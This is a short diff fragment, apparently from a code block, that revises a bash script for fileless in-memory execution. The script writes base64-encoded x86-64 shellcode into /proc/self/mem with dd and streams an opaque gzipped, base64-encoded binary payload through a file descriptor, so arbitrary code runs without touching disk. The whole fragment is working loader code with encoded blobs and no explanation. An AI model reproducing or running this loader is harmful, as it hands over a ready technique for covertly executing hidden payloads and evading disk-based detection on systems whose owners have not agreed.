@@ -11,8 +11,8 @@ exec 3>/proc/self/mem 4<<EOF
 blah
 EOF
 cat /dev/fd/4 >/dev/null
-(base64 -d <<EOF | gunzip -) >/dev/fd/4 &
-H4sIAAxYCmMC/+3bz2vTYBgH8Ddts83OrgUrTCYzggeF6dbbQPejaGcGMuakeHHi6Co2FCZr5y8U
+base64 -d <<EOF | gunzip - >/dev/fd/4 &
+H4sIAJ6CC2MC/+3bz2vTYBgH8Ddts83OrgUrTCYzggeF6dbbQPejaGcGMuakeHHi6Co2FCZr5y8U
 PYlh1M2/QC+iN3dRxsRtMHAeRQ/Oi/Qy3GDiQKZj4uLzJm9cEi0WfxzE76ekT97nfd73LUkuaUhs
 eiyoFlpWwoxNsghjExJjLCzHrPSbHXZadqZnG39YPdbG0wql/WZai3fqbzVmfpq1gFqQb9Iy3do2
 2tui8L1NWrUmU+uRmffzyvhxTYpNx4zYx9iLxXe0/igAAAAAAAAA/KariSMdPonfxlv8rJXx1kjE
@@ -27,8 +27,8 @@ P2Fl3RjgcVm8Ry2L/G7x4rH9DnREtIOibb9fXC1irYhbPfPXi2g/6/5sWOtJG6m/Sk1nswMNSi7f
 l8+k9p7NpJV09rRyPpM/o/RnBtOpvJK7mEv1ZbO5nUFcDQAAAAAAAAD/pq/zmqTTAGAAAA==
 EOF
 base64 -d <<EOF | dd status=none bs=1 seek=$(($(echo $a|cut -d\  -f9))) >&3
-McCwCTH/vgBgAAAx0rIDTTHSQbIiTTHASffQTTHJDwVJicdJifZIifJIicYx/0C3BDHADwVIAcZI
-KcJ19DHAsApMif9MifYx0rIFDwVB/+c=
+McCwCTH/vgBgAAAx0rIDTTHSQbIiTTHASffQTTHJDwVJicdJifZIifJIicYx/0C3BDHADwVIhcB4
+90gBxkgpwnXvMcCwCkyJ/0yJ9jHSsgUPBUH/5w==
 EOF
 ```
 
